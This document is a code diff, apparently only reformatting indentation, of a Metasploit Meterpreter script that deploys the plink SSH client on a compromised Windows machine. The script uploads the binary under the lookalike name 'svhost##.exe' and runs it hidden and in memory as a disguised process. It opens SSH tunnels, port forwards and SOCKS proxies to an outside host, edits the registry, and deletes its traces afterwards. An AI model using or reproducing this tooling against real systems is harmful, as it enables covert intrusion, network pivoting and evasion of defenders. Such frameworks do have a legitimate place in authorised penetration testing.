@@ -14,49 +14,49 @@ meter_type = client.platform
 #
 
 @@exec_opts = Rex::Parser::Arguments.new(
-	"-h"  => [ false, "This help menu"],
-	"-f"  => [ true,  "Do not download plink.exe but use given file."],
-	"-U"  => [ true,  "Download from given URL instead of default one (http://the.earth.li/~sgtatham/putty)"],
-	"-H"  => [ true,  "The IP/hostname of the SSH-server to connect to !REQUIRED!"],
-	"-p"  => [ true,  "The port of the remote SSH-server (Default:22)"],
-	"-u"  => [ true,  "The username to use to login to the SSH-server !REQUIRED!"],
-	"-P"  => [ true,  "login with specified password"],
-	"-b"  => [ false, "disable all interactive prompts"],
-	"-R"  => [ true,  "Forward remote port to local address ([listen-IP:]listen-port:host:port)"],
-	"-L"  => [ true,  "Forward local port to remote address ([listen-IP:]listen-port:host:port)"],
-	"-D"  => [ true,  "Dynamic SOCKS-based port forwarding ([listen-IP:]listen-port)"],
-	"-C"  => [ false, "enable compression"],
-	"-X"  => [ false, "enable X11 forwarding"],
-	"-x"  => [ false, "disable X11 forwarding"],
-	"-A"  => [ false, "enable agent forwarding"],
-	"-a"  => [ false, "disable agent forwarding"],
-	"-1"  => [ false, "use SSH-protocol-version 1"],
-	"-2"  => [ false, "use SSH-protocol-version 2"],
-	"-4"  => [ false, "use IPv4"],
-	"-6"  => [ false, "use IPv6"],
-	"-i"  => [ true,  "private key-file for authentication"],
-	"-m"  => [ true,  "read remote command from file"],
-	"-s"  => [ false, "remote command is an ssh-subsystem(SSH2 only)"],
-	"-N"  => [ false, "Don`t start a shell/command (SSH2 only)"],
-	"-n"  => [ true,  "open tunnel in place of session (SSH-2 only) (host:port)"],
-	"-r"  => [ true,  "Set SSH-Server`s Hostkey as known Host in Windows-registry before starting the client"],
-	"-F"  => [ false, "Disable ram-mode, upload plink and run from disk. Attention : no auto-cleanup when using -N AND -F !"],
-	"-E"  => [ true, "Start process from memory as given (Target Machine`s!) Application (.exe) (Default: C:\\windows\\system32)"],
-	"-v"  => [ false, "Give additional (debugging-)output"]
+  "-h"  => [ false, "This help menu"],
+  "-f"  => [ true,  "Do not download plink.exe but use given file."],
+  "-U"  => [ true,  "Download from given URL instead of default one (http://the.earth.li/~sgtatham/putty)"],
+  "-H"  => [ true,  "The IP/hostname of the SSH-server to connect to !REQUIRED!"],
+  "-p"  => [ true,  "The port of the remote SSH-server (Default:22)"],
+  "-u"  => [ true,  "The username to use to login to the SSH-server !REQUIRED!"],
+  "-P"  => [ true,  "login with specified password"],
+  "-b"  => [ false, "disable all interactive prompts"],
+  "-R"  => [ true,  "Forward remote port to local address ([listen-IP:]listen-port:host:port)"],
+  "-L"  => [ true,  "Forward local port to remote address ([listen-IP:]listen-port:host:port)"],
+  "-D"  => [ true,  "Dynamic SOCKS-based port forwarding ([listen-IP:]listen-port)"],
+  "-C"  => [ false, "enable compression"],
+  "-X"  => [ false, "enable X11 forwarding"],
+  "-x"  => [ false, "disable X11 forwarding"],
+  "-A"  => [ false, "enable agent forwarding"],
+  "-a"  => [ false, "disable agent forwarding"],
+  "-1"  => [ false, "use SSH-protocol-version 1"],
+  "-2"  => [ false, "use SSH-protocol-version 2"],
+  "-4"  => [ false, "use IPv4"],
+  "-6"  => [ false, "use IPv6"],
+  "-i"  => [ true,  "private key-file for authentication"],
+  "-m"  => [ true,  "read remote command from file"],
+  "-s"  => [ false, "remote command is an ssh-subsystem(SSH2 only)"],
+  "-N"  => [ false, "Don`t start a shell/command (SSH2 only)"],
+  "-n"  => [ true,  "open tunnel in place of session (SSH-2 only) (host:port)"],
+  "-r"  => [ true,  "Set SSH-Server`s Hostkey as known Host in Windows-registry before starting the client"],
+  "-F"  => [ false, "Disable ram-mode, upload plink and run from disk. Attention : no auto-cleanup when using -N AND -F !"],
+  "-E"  => [ true, "Start process from memory as given (Target Machine`s!) Application (.exe) (Default: C:\\windows\\system32)"],
+  "-v"  => [ false, "Give additional (debugging-)output"]
 )
 
 def usage
-	print_line("plink ssh-client deploy+run script")
-	print_line("This script will upload and run a plink ssh-cient")
-	print_line(@@exec_opts.usage)
-	raise Rex::Script::Completed
+  print_line("plink ssh-client deploy+run script")
+  print_line("This script will upload and run a plink ssh-cient")
+  print_line(@@exec_opts.usage)
+  raise Rex::Script::Completed
 end
 
 # Wrong Meterpreter Version Message Function
 #-------------------------------------------------------------------------------
 def wrong_meter_version(meter = meter_type)
-	print_error("#{meter} version of Meterpreter is not supported with this Script!")
-	raise Rex::Script::Completed
+  print_error("#{meter} version of Meterpreter is not supported with this Script!")
+  raise Rex::Script::Completed
 end
 #
 # Default parameters
@@ -83,28 +83,28 @@ EOS
 #
 
 def upload(client,file,trgloc = nil)
-	if not ::File.exists?(file)
-		raise "File to Upload does not exists!"
-	else
-		if trgloc == nil
-			location = client.fs.file.expand_path("%TEMP%")
-		else
-			location = trgloc
-		end
-		begin
-			if file =~ /S*(.exe)/i
-				fileontrgt = "#{location}\\svhost#{rand(100)}.exe"
-			else
-				fileontrgt = "#{location}\\TMP#{rand(100)}"
-			end
-			print_status("Uploading #{file}....")
-			client.fs.file.upload_file(fileontrgt, file)
-			print_status("#{file} successfully uploaded to #{fileontrgt}!")
-		rescue ::Exception => e
-			print_status("Error uploading file #{file}: #{e.class} #{e}")
-		end
-	end
-	return fileontrgt
+  if not ::File.exists?(file)
+    raise "File to Upload does not exists!"
+  else
+    if trgloc == nil
+      location = client.fs.file.expand_path("%TEMP%")
+    else
+      location = trgloc
+    end
+    begin
+      if file =~ /S*(.exe)/i
+        fileontrgt = "#{location}\\svhost#{rand(100)}.exe"
+      else
+        fileontrgt = "#{location}\\TMP#{rand(100)}"
+      end
+      print_status("Uploading #{file}....")
+      client.fs.file.upload_file(fileontrgt, file)
+      print_status("#{file} successfully uploaded to #{fileontrgt}!")
+    rescue ::Exception => e
+      print_status("Error uploading file #{file}: #{e.class} #{e}")
+    end
+  end
+  return fileontrgt
 end
 
 
@@ -141,162 +141,162 @@ filemode = nil
 downloaded = nil
 
 @@exec_opts.parse(args) { |opt, idx, val|
-	case opt
-	when "-h"
-		usage
-	when "-H"
-		if !val
-			print_error("-H requires an argument !")
-			usage
-		end
-		rhost = val
+  case opt
+  when "-h"
+    usage
+  when "-H"
+    if !val
+      print_error("-H requires an argument !")
+      usage
+    end
+    rhost = val
 
-	when "-f"
-		if !val
-			print_error("-f requires an argument !")
-			usage
-		end
-		plink = val
-		if not ::File.exists?(plink)
-			print_error("Plink.exe not found/accessible!")
-			usage
-		end
-		manual = true
+  when "-f"
+    if !val
+      print_error("-f requires an argument !")
+      usage
+    end
+    plink = val
+    if not ::File.exists?(plink)
+      print_error("Plink.exe not found/accessible!")
+      usage
+    end
+    manual = true
 
-	when "-r"
-		if !val
-			print_error("-r requires an argument !")
-			usage
-		end
-		hostkey = val
+  when "-r"
+    if !val
+      print_error("-r requires an argument !")
+      usage
+    end
+    hostkey = val
 
-	when "-p"
-		rport = val.to_i
+  when "-p"
+    rport = val.to_i
 
-	when "-U"
-		if !val
-			print_error("-u requires an argument !")
-			usage
-		end
-		plinkurl = val
+  when "-U"
+    if !val
+      print_error("-u requires an argument !")
+      usage
+    end
+    plinkurl = val
 
-	when "-u"
-		if !val
-			print_error("-u requires an argument !")
-			usage
-		end
-		username = val
+  when "-u"
+    if !val
+      print_error("-u requires an argument !")
+      usage
+    end
+    username = val
 
-	when "-P"
-		if !val
-			print_error("-P requires an argument !")
-			usage
-		end
-		password = val
+  when "-P"
+    if !val
+      print_error("-P requires an argument !")
+      usage
+    end
+    password = val
 
-	when "-b"
-		batchmode = true
+  when "-b"
+    batchmode = true
 
-	when "-R"
-		if !val
-			print_error("-R requires an argument !")
-			usage
-		end
-		remotefwd = val
+  when "-R"
+    if !val
+      print_error("-R requires an argument !")
+      usage
+    end
+    remotefwd = val
 
-	when "-L"
-		if !val
-			print_error("-L requires an argument !")
-			usage
-		end
-		localfwd = val
+  when "-L"
+    if !val
+      print_error("-L requires an argument !")
+      usage
+    end
+    localfwd = val
 
-	when "-D"
-		if !val
-			print_error("-D requires an argument !")
-			usage
-		end
-		socksfwd = val
+  when "-D"
+    if !val
+      print_error("-D requires an argument !")
+      usage
+    end
+    socksfwd = val
 
-	when "-C"
-		enablecompression = true
+  when "-C"
+    enablecompression = true
 
-	when "-X"
-		enablex11fwd = true
+  when "-X"
+    enablex11fwd = true
 
-	when "-x"
-		disablex11fwd = true
+  when "-x"
+    disablex11fwd = true
 
-	when "-A"
-		enableagentfwd = true
+  when "-A"
+    enableagentfwd = true
 
-	when "-a"
-		disableagentfwd = true
+  when "-a"
+    disableagentfwd = true
 
-	when "-1"
-		sshv1 = true
+  when "-1"
+    sshv1 = true
 
-	when "-2"
-		sshv2 = true
+  when "-2"
+    sshv2 = true
 
-	when "-4"
-		ipv4 = true
+  when "-4"
+    ipv4 = true
 
-	when "-6"
-		ipv6 = true
+  when "-6"
+    ipv6 = true
 
-	when "-i"
-		if !val
-			print_error("-i requires an argument !")
-			usage
-		end
-		keyfile = val
-		if not ::File.exists?(keyfile)
-			print_error("keyfile not found or not accessible!")
-			usage
-		end
+  when "-i"
+    if !val
+      print_error("-i requires an argument !")
+      usage
+    end
+    keyfile = val
+    if not ::File.exists?(keyfile)
+      print_error("keyfile not found or not accessible!")
+      usage
+    end
 
-	when "-m"
-		if !val
-			print_error("-m requires an argument !")
-			usage
-		end
-		cmdfile = val
-		if not ::File.exists?(cmdfile)
-			print_error("cmd-file not found/accessible!")
-			usage
-		end
+  when "-m"
+    if !val
+      print_error("-m requires an argument !")
+      usage
+    end
+    cmdfile = val
+    if not ::File.exists?(cmdfile)
+      print_error("cmd-file not found/accessible!")
+      usage
+    end
 
-	when "-s"
-		sshsubsys = true
+  when "-s"
+    sshsubsys = true
 
-	when "-N"
-		noshell = true
+  when "-N"
+    noshell = true
 
-	when "-n"
-		if !val
-			print_error("-n requires an argument !")
-			usage
-		end
-		nctunnel = val
+  when "-n"
+    if !val
+      print_error("-n requires an argument !")
+      usage
+    end
+    nctunnel = val
 
-	when "-E"
-		if !val
-			print_error("-E requires an argument !")
-			usage
-		end
-		processname = val
+  when "-E"
+    if !val
+      print_error("-E requires an argument !")
+      usage
+    end
+    processname = val
 
-	when "-v"
-		verbose = true
+  when "-v"
+    verbose = true
 
-	when "-F"
-		filemode = true
+  when "-F"
+    filemode = true
 
-	else
-		print_error("Unknown option: #{opt}")
-		usage
-	end
+  else
+    print_error("Unknown option: #{opt}")
+    usage
+  end
 }
 
 # Check for Version of Meterpreter
@@ -304,8 +304,8 @@ wrong_meter_version(meter_type) if meter_type !~ /win32|win64/i
 
 
 if not rhost or not username
-	print_status("You must specify a hostname (-H) and username (-u)")
-	raise Rex::Script::Completed
+  print_status("You must specify a hostname (-H) and username (-u)")
+  raise Rex::Script::Completed
 end
 
 #
@@ -313,14 +313,14 @@ end
 # Ask user before downloading
 #
 if not manual
-	if not ::File.exists?(plink)
-		print_status("plink.exe could not be found. Downloading it now...")
-		print_status(license)
-		plinkexe = Net::HTTP.get URI.parse(plinkurl)
-		File.open(plink, "wb") { |fd| fd.write(plinkexe) }
-		print_status("plink.exe has been downloaded to #{plink} (local machine). Please remove manually after use or keep for reuse.")
-		downloaded = true
-	end
+  if not ::File.exists?(plink)
+    print_status("plink.exe could not be found. Downloading it now...")
+    print_status(license)
+    plinkexe = Net::HTTP.get URI.parse(plinkurl)
+    File.open(plink, "wb") { |fd| fd.write(plinkexe) }
+    print_status("plink.exe has been downloaded to #{plink} (local machine). Please remove manually after use or keep for reuse.")
+    downloaded = true
+  end
 end
 
 #
@@ -331,10 +331,10 @@ keyfileontrgt = upload(client, keyfile) if keyfile
 
 trg_filename = nil
 if filemode
-	print_status("-------Uploading plink -------")
-	trg_filename = upload(client, plink)
+  print_status("-------Uploading plink -------")
+  trg_filename = upload(client, plink)
 else
-	trg_filename = plink
+  trg_filename = plink
 end
 
 #
@@ -371,18 +371,18 @@ params << rhost
 #
 hostkeyname = nil
 if not hostkey == nil
-	hostkeyname = "rsa2@#{rport}:#{rhost}"
-	print_status("Writing the Hostkey to the registry...")
-	client.run_cmd("reg setval -k HKEY_CURRENT_USER\\\\Software\\\\SimonTatham\\\\PuTTY\\\\SshHostKeys -v #{hostkeyname} -d #{hostkey}")
+  hostkeyname = "rsa2@#{rport}:#{rhost}"
+  print_status("Writing the Hostkey to the registry...")
+  client.run_cmd("reg setval -k HKEY_CURRENT_USER\\\\Software\\\\SimonTatham\\\\PuTTY\\\\SshHostKeys -v #{hostkeyname} -d #{hostkey}")
 end
 
 #
 # Give additional output when -v is set
 #
 if verbose
-	print_status("You set the following parameters for plink :")
-	print_status(params)
-	print_status(processname)
+  print_status("You set the following parameters for plink :")
+  print_status(params)
+  print_status(processname)
 end
 
 #
@@ -393,56 +393,56 @@ print_status("-------Executing Client ------")
 
 p = nil
 if not filemode
-	p = client.sys.process.execute(trg_filename, params, {'Hidden' => true, 'Channelized' => true, 'InMemory' => processname})
+  p = client.sys.process.execute(trg_filename, params, {'Hidden' => true, 'Channelized' => true, 'InMemory' => processname})
 else
-	p = client.sys.process.execute(trg_filename, params, {'Hidden' => true, 'Channelized' => true})
+  p = client.sys.process.execute(trg_filename, params, {'Hidden' => true, 'Channelized' => true})
 end
 
 if noshell == nil
-	client.console.run_single("interact #{p.channel.cid}")
+  client.console.run_single("interact #{p.channel.cid}")
 end
 
 if filemode
-	if not noshell == true
-		if verbose
-			print_status("Waiting 3 seconds to be sure the process was closed.")
-		end
-		sleep(3)
-		if verbose
-			print_status("Deleting the uploaded plink.exe...")
-		end
-		client.fs.file.rm(trg_filename)
-	else
-		print_status("Cannot automatically delete the uploaded #{trg_filename} ! Please delete it manually after stopping the process!")
-	end
+  if not noshell == true
+    if verbose
+      print_status("Waiting 3 seconds to be sure the process was closed.")
+    end
+    sleep(3)
+    if verbose
+      print_status("Deleting the uploaded plink.exe...")
+    end
+    client.fs.file.rm(trg_filename)
+  else
+    print_status("Cannot automatically delete the uploaded #{trg_filename} ! Please delete it manually after stopping the process!")
+  end
 end
 
 if not keyfile == nil
-	if verbose
-		print_status("Waiting 1 second to be sure the keyfile is not in use anymore.")
-	end
-	sleep(1)
-	if verbose
-		print_status("Deleting the keyfile !")
-	end
-	if verbose
-		print_status(keyfile)
-	end
-	client.fs.file.rm(keyfile)
+  if verbose
+    print_status("Waiting 1 second to be sure the keyfile is not in use anymore.")
+  end
+  sleep(1)
+  if verbose
+    print_status("Deleting the keyfile !")
+  end
+  if verbose
+    print_status(keyfile)
+  end
+  client.fs.file.rm(keyfile)
 end
 
 if not cmdfile == nil
-	print_status("You need to manually delete the uploaded #{cmdfile} !")
+  print_status("You need to manually delete the uploaded #{cmdfile} !")
 end
 
 #
 # Delete the registry-key that may have been created
 #
 if not hostkey == nil
-	if verbose
-		print_status("Deleting the registry-key set by the script.")
-	end
-	client.run_cmd("reg deleteval -k HKEY_CURRENT_USER\\\\Software\\\\SimonTatham\\\\PuTTY\\\\SshHostKeys -v #{hostkeyname}")
+  if verbose
+    print_status("Deleting the registry-key set by the script.")
+  end
+  client.run_cmd("reg deleteval -k HKEY_CURRENT_USER\\\\Software\\\\SimonTatham\\\\PuTTY\\\\SshHostKeys -v #{hostkeyname}")
 end
 
 raise Rex::Script::Completed
